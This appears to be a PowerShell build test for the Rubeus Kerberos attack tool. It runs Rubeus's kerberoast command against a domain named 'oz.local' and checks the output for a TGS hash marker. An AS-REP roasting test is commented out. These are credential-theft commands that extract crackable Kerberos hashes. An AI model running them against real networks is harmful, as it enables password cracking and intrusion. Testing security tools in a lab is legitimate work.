# Test if the executable was created
if (Test-Path Rubeus\bin\Release\Rubeus.exe) 
{
	# Kerberoast Test
	$kerberos_output = (cmd /s /c "Rubeus\bin\Release\Rubeus.exe kerberoast /domain:oz.local")

	# Test if kerberoast output matches expected
	if ($kerberos_output -match '$krb5tgs$23$') 
	{ 
		Write-Output "Kerberoast Test Passed"
	} 
	else 
	{
		Write-Output "Kerberoast Test Failed"
	}
	
	# AS-Rep Roast Test
	#$asreproast_output = (cmd /s /c "Rubeus\bin\Release\Rubeus.exe asreproast /domain:oz.local")
	
	# Test if kerberoast output matches expected
	#if ($asreproast_output -match '$krb5asrep$') 
	#{ 
		#Write-Output "AS-Rep Roast Test Passed"
	#} 
	#else 
	#{
		#Write-Output "AS-Rep Roast Test Failed"
	#}
}
else
{
	Write-Output "Build Failed"
}